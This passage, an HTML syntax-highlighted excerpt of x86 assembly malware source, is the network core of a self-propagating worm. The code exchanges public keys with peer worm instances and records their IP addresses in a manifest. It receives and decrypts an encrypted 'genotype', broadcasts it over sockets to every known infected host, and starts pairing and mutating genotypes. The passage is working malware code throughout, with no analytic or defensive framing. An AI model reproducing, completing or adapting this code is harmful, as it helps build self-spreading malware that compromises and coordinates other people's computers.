    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;get response from worm</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">socket_server_loop</span><span class="sc0">      </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDKEY</span><span class="sc0">  </span><span class="sc1">;does it send its public key?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_server_loop</span><span class="sc0">      </span><span class="sc1">;quit if not</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get size of data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;to EBX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">public_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc1">;ptr to public key storage</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;store public key</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">socket_server_loop</span><span class="sc0">      </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">import_key</span><span class="sc0">          </span><span class="sc1">;import worm's public key</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">socket_server_loop</span><span class="sc0">      </span><span class="sc1">;quit if error</span><span class="sc0">


    </span><span class="sc1">;SENDING ITS OWN PUBLIC KEY...</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">export_key</span><span class="sc0">          </span><span class="sc1">;export its own public key</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;quit if error</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pubkey_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">response</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc1">;save size of its own public key</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">public_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc1">;get ptr to public key</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">response</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send header</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send data (public key)</span><span class="sc0">


    </span><span class="sc1">;PUBLIC KEYZ ARE ALREADY EXCHANGED, STORE WORM'S IP ADDRESS...</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get ptr to MANIFEST</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.MAN_IPSPTR</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get rva to IP storage</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;normalize to va ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get number of IPs</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; * 4 (size of one IP)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get to end of </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_socket</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;get IP address of the worm</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">new_eh</span><span class="sc0">              </span><span class="sc1">;__try block</span><span class="sc0">

    </span><span class="sc1">;__except block</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esp.EH_ContextRecord</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc5">ecx.CONTEXT_Ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_page</span><span class="sc0">          </span><span class="sc1">;allocate next page</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">q_seh</span><span class="sc0">

</span><span class="sc5">new_eh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">q_seh</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store new IP to IP storage</span><span class="sc0">
    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;increment "number of IPs" variable</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_genotype_only</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc1">;de-nulify this variable</span><span class="sc0">

    </span><span class="sc1">;PERFORM CHECKS AND RECIEVE ENCRYPTED GENOTYPE...</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get status code</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">WORMNET_SENDGENOTYPEONLY</span><span class="sc0"> </span><span class="sc1">;is it genotype broadcast?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">server_nextcheck</span><span class="sc0">        </span><span class="sc1">;no, continue</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_genotype_only</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">server_overcheck</span><span class="sc0">        </span><span class="sc1">;nulify variable and continue</span><span class="sc0">

</span><span class="sc5">server_nextcheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">WORMNET_SENDGENOTYPE</span><span class="sc0">     </span><span class="sc1">;does the worm send genotype?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;no, quit</span><span class="sc0">

</span><span class="sc5">server_overcheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;get size of encrypted genotype</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;to EBX</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">            </span><span class="sc1">;allocate memory for it</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_mem_genotype</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save memory ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;recieve encrypted genotype</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;quit if error</span><span class="sc0">


    </span><span class="sc1">;DECRYPT RECIEVED GENOTYPE...</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_gen_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;EBX = encrypted block size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;initialize pointerz</span><span class="sc0">
</span><span class="sc5">st_decrypt_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;copy one block to continuous plaintext block</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;is it last block?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_decrypt_final</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_decrypt</span><span class="sc0">           </span><span class="sc1">;decrypt one block</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;correct variables and continue</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_gen_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_decrypt_loop</span><span class="sc0">



</span><span class="sc5">st_decrypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_decrypt_final</span><span class="sc0"> </span><span class="sc1">;decrypt final block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_gen_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">



    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;broadcast this genotype?</span><span class="sc0">
</span><span class="sc5">mut_nonstop_traffic</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_end_broadcast</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;no, dont send it to other worms</span><span class="sc0">
                    </span><span class="sc1">;(no nonstop network traffic thru this computer)</span><span class="sc0">


    </span><span class="sc1">;BROADCAST GENOTYPE TO ALL KNOWN WORMS...</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get ptr to MANIFEST</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.MAN_IPSPTR</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get rva to IP storage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get count of stored IPs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;get va ptr to IP storage</span><span class="sc0">
</span><span class="sc5">st_ip_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_socket</span><span class="sc0">           </span><span class="sc1">;create socket</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_end_broadcast</span><span class="sc0">        </span><span class="sc1">;quit if error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;save it</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get IP from IP storage</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0100007Fh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_next_ip</span><span class="sc0">          </span><span class="sc1">;discard localhost entry</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">160</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_gethostname</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;get name of this computer</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">_gethostbyname</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;get IP address of this computer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;is the IP of worm the same as IP of this computer?</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_next_ip</span><span class="sc0">      </span><span class="sc1">;yeah, get next IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socket_address3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                    </span><span class="sc1">;save address of worm</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">sizeofsocket</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@st_socket</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0C200h</span><span class="sc0">
</span><span class="sc5">socket_address3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@st_socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hSocket3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;connect to worm</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">st_next_ip</span><span class="sc0">          </span><span class="sc1">;quit if error</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">genotype_broadcast</span><span class="sc0">      </span><span class="sc1">;send genotype there</span><span class="sc0">
</span><span class="sc5">st_next_ip</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">hSocket3</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;close connection</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">st_ip_loop</span><span class="sc0">          </span><span class="sc1">;and get next IP</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">st_end_broadcast</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">


    </span><span class="sc1">;PAIR TWO GENOTYPES AND MUTATE THE RESULT...</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@pair_ebx</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@pair_ebx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_mem_genotype</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save address of new genotype as argument</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENOTYPE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
